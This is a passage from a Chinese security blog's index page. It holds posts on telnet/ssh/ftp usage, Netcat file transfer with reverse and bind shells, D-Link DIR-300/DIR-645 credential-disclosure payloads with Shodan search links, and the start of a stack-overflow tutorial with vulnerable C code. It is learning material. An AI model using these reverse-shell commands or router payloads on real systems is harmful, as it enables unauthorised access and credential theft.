<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>fanson&#39;s Blog</title>

  
  <meta name="author" content="fanson">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="fanson&#39;s Blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">fanson&#39;s Blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/01/06/一些常用服务的linux-command/"><span>一些常用服务的linux-command</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/01/06/一些常用服务的linux-command/" rel="bookmark">
        <time class="entry-date published" datetime="2019-01-06T10:22:30.000Z">
          2019-01-06
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h1><p>登录远程主机和管理(测试ip端口是否连通) </p>
<p><strong>telnet命令</strong> 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。</p>
<p><strong>语法：</strong></p>
<p>telnet(选项)(参数) </p>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-8：允许使用8位字符资料，包括输入与输出；</span><br><span class="line">-a：尝试自动登入远端系统；</span><br><span class="line">-b&lt;主机别名&gt;：使用别名指定远端主机名称；</span><br><span class="line">-c：不读取用户专属目录里的.telnetrc文件；</span><br><span class="line">-d：启动排错模式；</span><br><span class="line">-e&lt;脱离字符&gt;：设置脱离字符；</span><br><span class="line">-E：滤除脱离字符；</span><br><span class="line">-f：此参数的效果和指定&quot;-F&quot;参数相同；</span><br><span class="line">-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；</span><br><span class="line">-k&lt;域名&gt;：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；</span><br><span class="line">-K：不自动登入远端主机；</span><br><span class="line">-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；</span><br><span class="line">-L：允许输出8位字符资料；</span><br><span class="line">-n&lt;记录文件&gt;：指定文件记录相关信息；</span><br><span class="line">-r：使用类似rlogin指令的用户界面；</span><br><span class="line">-S&lt;服务类型&gt;：设置telnet连线所需的ip TOS信息；</span><br><span class="line">-x：假设主机有支持数据加密的功能，就使用它；</span><br><span class="line">-X&lt;认证形态&gt;：关闭指定的认证形态。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>远程主机：指定要登录进行管理的远程主机；</li>
<li>端口：指定TELNET协议使用的端口号。</li>
</ul>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.2.10</span><br><span class="line">Trying 192.168.2.10...</span><br><span class="line">Connected to 192.168.2.10 (192.168.2.10).</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line"></span><br><span class="line">    localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)</span><br><span class="line"></span><br><span class="line">login: root</span><br><span class="line">Password:</span><br><span class="line">Login incorrect</span><br></pre></td></tr></table></figure>
<p>一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.188.132</span><br><span class="line">Trying 192.168.188.132...</span><br><span class="line">telnet: connect to address 192.168.188.132: Connection refused</span><br><span class="line">telnet: Unable to connect to remote host</span><br></pre></td></tr></table></figure>
<p>处理这种情况方法：</p>
<ol>
<li><p>确认ip地址是否正确？</p>
</li>
<li><p>确认ip地址对应的主机是否已经开机？</p>
</li>
<li><p>如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看）</p>
</li>
<li><p>如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行）</p>
</li>
<li><p>如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看）</p>
<p><strong>启动telnet服务</strong></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure>
<p>配置参数，通常的配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service telnet</span><br><span class="line">&#123;</span><br><span class="line">    disable = no #启用</span><br><span class="line">    flags = REUSE #socket可重用</span><br><span class="line">    socket_type = stream #连接方式为TCP</span><br><span class="line">    wait = no #为每个请求启动一个进程</span><br><span class="line">    user = root #启动服务的用户为root</span><br><span class="line">    server = /usr/sbin/in.telnetd #要激活的进程</span><br><span class="line">    log_on_failure += USERID #登录失败时记录登录用户名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果要配置允许登录的客户端列表，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only_from = 192.168.0.2 #只允许192.168.0.2登录</span><br></pre></td></tr></table></figure>
<p>如果要配置禁止登录的客户端列表，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no_access = 192.168.0.&#123;2,3,4&#125; #禁止192.168.0.2、192.168.0.3、192.168.0.4登录</span><br></pre></td></tr></table></figure>
<p>如果要设置开放时段，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P）</span><br></pre></td></tr></table></figure>
<p>如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind = 192.168.0.2</span><br></pre></td></tr></table></figure>
<p>各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf）</p>
<p>配置端口，修改services文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/services</span><br></pre></td></tr></table></figure>
<p>找到以下两句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 23/tcp</span><br><span class="line">telnet 23/udp</span><br></pre></td></tr></table></figure>
<p>如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。</p>
<p>启动服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure>
<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>openssh套件中的客户端连接工具</p>
<p><strong>ssh命令</strong> 是openssh套件中的客户端连接工具，可以给予ssh加密协议实现安全的远程登录服务器。</p>
<p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh(选项)(参数)</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-1：强制使用ssh协议版本1；</span><br><span class="line">-2：强制使用ssh协议版本2；</span><br><span class="line">-4：强制使用IPv4地址；</span><br><span class="line">-6：强制使用IPv6地址；</span><br><span class="line">-A：开启认证代理连接转发功能；</span><br><span class="line">-a：关闭认证代理连接转发功能；</span><br><span class="line">-b：使用本机指定地址作为对应连接的源ip地址；</span><br><span class="line">-C：请求压缩所有数据；</span><br><span class="line">-F：指定ssh指令的配置文件；</span><br><span class="line">-f：后台执行ssh指令；</span><br><span class="line">-g：允许远程主机连接主机的转发端口；</span><br><span class="line">-i：指定身份文件；</span><br><span class="line">-l：指定连接远程服务器登录用户名；</span><br><span class="line">-N：不执行远程指令；</span><br><span class="line">-o：指定配置选项；</span><br><span class="line">-p：指定远程服务器上的端口；</span><br><span class="line">-q：静默模式；</span><br><span class="line">-X：开启X11转发功能；</span><br><span class="line">-x：关闭X11转发功能；</span><br><span class="line">-y：开启信任X11转发功能。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>远程主机：指定要连接的远程ssh服务器；</li>
<li>指令：要在远程ssh服务器上执行的指令。</li>
</ul>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ssh 用户名@远程服务器地址</span><br><span class="line">ssh user1@172.24.210.101</span><br><span class="line"># 指定端口</span><br><span class="line">ssh -p 2211 root@140.206.185.170</span><br><span class="line"></span><br><span class="line"># ssh 大家族</span><br><span class="line">ssh user@ip -p22 # 默认用户名为当前用户名，默认端口为 22</span><br><span class="line">ssh-keygen # 为当前用户生成 ssh 公钥 + 私钥</span><br><span class="line">ssh-keygen -f keyfile -i -m key_format -e -m key_format # key_format: RFC4716/SSH2(default) PKCS8 PEM</span><br><span class="line">ssh-copy-id user@ip:port # 将当前用户的公钥复制到需要 ssh 的服务器的 ~/.ssh/authorized_keys，之后可以免密登录</span><br></pre></td></tr></table></figure>
<h1 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h1><p>用来设置文件系统相关功能</p>
<p><strong>ftp命令</strong> 用来设置文件系统相关功能。ftp服务器在网上较为常见，Linux ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux ftp命令的一些经常使用的命令，相信掌握了这些使用Linux进行ftp操作将会非常容易。</p>
<p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp(选项)(参数)</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-d：详细显示指令执行过程，便于排错或分析程序执行的情况；</span><br><span class="line">-i：关闭互动模式，不询问任何问题；</span><br><span class="line">-g：关闭本地主机文件名称支持特殊字符的扩充特性；</span><br><span class="line">-n：不使用自动登录；</span><br><span class="line">-v：显示指令执行过程。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<p>主机：指定要连接的FTP服务器的主机名或ip地址。</p>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ascii  # 设定以ASCII方式传送文件(缺省值) </span><br><span class="line">ftp&gt; bell   # 每完成一次文件传送,报警提示. </span><br><span class="line">ftp&gt; binary # 设定以二进制方式传送文件. </span><br><span class="line">ftp&gt; bye    # 终止主机FTP进程,并退出FTP管理方式. </span><br><span class="line">ftp&gt; case   # 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母. </span><br><span class="line">ftp&gt; cd     # 同UNIX的CD命令. </span><br><span class="line">ftp&gt; cdup   # 返回上一级目录. </span><br><span class="line">ftp&gt; chmod  # 改变远端主机的文件权限. </span><br><span class="line">ftp&gt; close  # 终止远端的FTP进程,返回到FTP命令状态, 所有的宏定义都被删除. </span><br><span class="line">ftp&gt; delete # 删除远端主机中的文件. </span><br><span class="line">ftp&gt; dir [remote-directory] [local-file] # 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件. </span><br><span class="line">ftp&gt; get [remote-file] [local-file] # 从远端主机中传送至本地主机中. </span><br><span class="line">ftp&gt; help [command] # 输出命令的解释. </span><br><span class="line">ftp&gt; lcd # 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录. </span><br><span class="line">ftp&gt; ls [remote-directory] [local-file] # 同DIR. </span><br><span class="line">ftp&gt; macdef                 # 定义宏命令. </span><br><span class="line">ftp&gt; mdelete [remote-files] # 删除一批文件. </span><br><span class="line">ftp&gt; mget [remote-files]    # 从远端主机接收一批文件至本地主机. </span><br><span class="line">ftp&gt; mkdir directory-name   # 在远端主机中建立目录. </span><br><span class="line">ftp&gt; mput local-files # 将本地主机中一批文件传送至远端主机. </span><br><span class="line">ftp&gt; open host [port] # 重新建立一个新的连接. </span><br><span class="line">ftp&gt; prompt           # 交互提示模式. </span><br><span class="line">ftp&gt; put local-file [remote-file] # 将本地一个文件传送至远端主机中. </span><br><span class="line">ftp&gt; pwd  # 列出当前远端主机目录. </span><br><span class="line">ftp&gt; quit # 同BYE. </span><br><span class="line">ftp&gt; recv remote-file [local-file] # 同GET. </span><br><span class="line">ftp&gt; rename [from] [to]     # 改变远端主机中的文件名. </span><br><span class="line">ftp&gt; rmdir directory-name   # 删除远端主机中的目录. </span><br><span class="line">ftp&gt; send local-file [remote-file] # 同PUT. </span><br><span class="line">ftp&gt; status   # 显示当前FTP的状态. </span><br><span class="line">ftp&gt; system   # 显示远端主机系统类型. </span><br><span class="line">ftp&gt; user user-name [password] [account] # 重新以别的用户名登录远端主机. </span><br><span class="line">ftp&gt; ? [command] # 同HELP. [command]指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。</span><br><span class="line">ftp&gt; ! # 从 ftp 子系统退出到外壳。</span><br></pre></td></tr></table></figure>
<p>关闭FTP连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bye</span><br><span class="line">exit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p>下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get readme.txt # 下载 readme.txt 文件</span><br><span class="line">ftp&gt; mget *.txt     # 下载</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put /path/readme.txt # 上传 readme.txt 文件</span><br><span class="line">ftp&gt; mput *.txt           # 可以上传多个文件</span><br></pre></td></tr></table></figure>
<p>内容来自【<a href="https://wangchujiang.com/linux-command/c/ssh.html】整理为笔记以记之" target="_blank" rel="noopener">https://wangchujiang.com/linux-command/c/ssh.html】整理为笔记以记之</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/tools/">tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/03/Netcat-工具使用/"><span>Netcat 工具使用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/03/Netcat-工具使用/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-03T15:06:06.000Z">
          2018-12-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h4 id="Netcat的工具使用总结："><a href="#Netcat的工具使用总结：" class="headerlink" title="Netcat的工具使用总结："></a>Netcat的工具使用总结：</h4><p>一，Netcat Banner获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port]</span><br></pre></td></tr></table></figure>
<p>二，文件传输</p>
<p>例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888 &gt; 文件路径</span><br></pre></td></tr></table></figure>
<p>在攻击机上，我们连接到该8888端口并发送文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] &lt; 文件路径</span><br></pre></td></tr></table></figure>
<p>三，Bind Shells &amp;Reverse Shells</p>
<p>在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
<p>Reverse Shell:</p>
<p>1.设置一个Netcat侦听器，（我们侦听端口8888）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
<p>2.接下来我们在目标主机上执行下面的命令来连接我们的攻击主机（记住我们在这个攻击主机上执行了远程代码）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] -e /bin/bash    &lt;for linux&gt;</span><br><span class="line">nc.exe [ip-address] [port] -e cmd.exe  &lt;for windows&gt;</span><br></pre></td></tr></table></figure>
<p>若目标主机没有Netcat，我们使用其他方法来代替</p>
<p>Bash反向shell，使用Bash通过使用以下命令从目标主机启动反向shell连接攻击主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp;/dev/tcp/[ip-address]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>python反向shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c’import socket，subprocess，os; s = socket.socket(socket.AF_INET，socket.SOCK_STREAM); s.connect((“[ip-address]”，[port])); os.dup2（s.fileno()，0); os.dup2(s.fileno()，1); os.dup2(s.fileno()，2); P = subprocess.call([“/ bin / sh”，” - i”]);”</span><br></pre></td></tr></table></figure>
<p>Bind Shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attacker:nc [ip-address] [port]</span><br><span class="line">Target:  nc -lvp [port] -e /bin/sh</span><br></pre></td></tr></table></figure>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Tools/">Tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/11/01/路由器漏洞挖掘入门/"><span>路由器漏洞挖掘入门</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/11/01/路由器漏洞挖掘入门/" rel="bookmark">
        <time class="entry-date published" datetime="2018-11-01T15:19:08.000Z">
          2018-11-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>周末在家闲着，也趁着这个时间来入门学习下路由器漏洞挖掘！网上查阅的D-Link系列的漏洞也不少，那就从D-Link路由器漏洞开始学习，顺便刚好也好跟着<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">创宇paper</a>学习，就当是学习笔记了！</p>
<h4 id="一：准备工作"><a href="#一：准备工作" class="headerlink" title="一：准备工作"></a>一：准备工作</h4><ul>
<li><code>binwalk</code>:用来解开固件包</li>
<li>路由器的固件：<a href="ftp://ftp2.dlink.com/PRODUCTS/" target="_blank" rel="noopener">ftp://ftp2.dlink.com/PRODUCTS/</a></li>
</ul>
<p>完成<code>binwalk</code>的安装后，”<code>binwalk -Me</code> 固件包名称”来解相对应的固件。</p>
<h4 id="二：漏洞挖掘"><a href="#二：漏洞挖掘" class="headerlink" title="二：漏洞挖掘"></a>二：漏洞挖掘</h4><p>D-Link DIR-300 信息泄露漏洞</p>
<p><a href="https://www.shodan.io/search?query=DIR-300" target="_blank" rel="noopener">shodan :DIR-300</a></p>
<p>我们先下载<code>D-Link DIR-300</code>的固件并且解固件</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/1.PNG" alt=""></p>
<p>在解固件之后，进入 <code>suashfs-root/www</code> 文件夹，漏洞出现在<code>/model/__show_info.php</code>文件。</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/2.PNG" alt=""></p>
<p>这里看到已经禁止了<code>$REQUIRE_FILE</code>的参数为<code>var/etc/httpasswd</code>和<code>var/etc/hnapasswd</code>。这样的话看起来我们是无法获取账号密码的。那如果我们从根路径开始配置<code>httpasswd</code>的路径，那么是不是就可以绕过这个过滤了呢！</p>
<p>payload：（<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">创宇</a>）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/model/__show_info.php?REQUIRE_FILE=/<span class="keyword">var</span>/etc/httpasswd</span><br></pre></td></tr></table></figure>
<p>这里设置<code>REQUIRE_FILE=/var/etc/httpasswd</code> 成功绕过上面的 <code>if</code>判断，进行任意文件读取。</p>
<p>D-Link DIR-645信息泄露漏洞</p>
<p><a href="https://www.shodan.io/search?query=DIR-645" target="_blank" rel="noopener">shodan:DIR-645</a></p>
<p>同样该漏洞出现在 <code>suashfs-root/htdocs</code> 文件夹<code>getcfg.php</code> 文件由于过滤不严格导致信息泄露漏洞</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/5.PNG" alt=""></p>
<p>该代码中 <code>$GETCFG_SVC</code> 没有任何过滤直接获取了 POST 传递过来的<code>SERVICES</code>的值。如果<code>$GETCFG_SVC</code>不为空，则进行文件读取。这里我们就可以读取存储此设备信息的<code>DEVICE.ACCOUNT.xml.php</code>文件。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/getcfg.php</span><br><span class="line">post:SERVICES=DEVICE.ACCOUNT</span><br></pre></td></tr></table></figure>
<p>说了这么久了，实战走一波吧！</p>
<p>进入D-Link DIR-645的web登录页面，则显示需要用户与密码则可登录，那么接下来我们来获取他们</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/6.PNG" alt=""></p>
<p>利用payload打一波</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/3.PNG" alt=""></p>
<p>果然，我们可以清楚地看到账号密码，继续登录验证，登录成功</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/4.PNG" alt=""></p>
<h4 id="三：参考"><a href="#三：参考" class="headerlink" title="三：参考"></a>三：参考</h4><p>【1】<a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf" target="_blank" rel="noopener">.http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf</a></p>
<p>【2】<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">https://paper.seebug.org/429/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/漏洞挖掘/">漏洞挖掘</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/28/栈溢出学习笔记/"><span>栈溢出学习笔记</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/28/栈溢出学习笔记/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-28T10:19:40.000Z">
          2018-10-28
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在上一篇博客中对栈溢出的相关原理进行了浅析，接下来我找了个实例来进一步来加强理解，首先我们来看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"> <span class="keyword">int</span> r;</span><br><span class="line"> r = read(<span class="number">0</span>, buf, <span class="number">400</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\nRead %d bytes. buf is %s\n"</span>, r, buf);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">"No shell for you :("</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Try to exec /bin/sh"</span>);</span><br><span class="line"> vuln();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>操作系统提供了许多安全机制来试图降低或阻止缓冲区溢出攻击带来的安全风险，包括<code>DEP、ASLR</code>等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了<code>DEP</code>（<code>Linux</code>下对应<code>NX</code>）、<code>ASLR</code>（<code>Linux</code>下对应<code>PIE</code>）等机制，例如存在<code>DEP</code>（<code>NX</code>）的话就不能直接执行栈上的数据，存在<code>ASLR</code>的话各个系统调用的地址就是随机化的。所以在编译之前，首先要来关闭掉<code>linux</code>系统栈保护机制。</p>
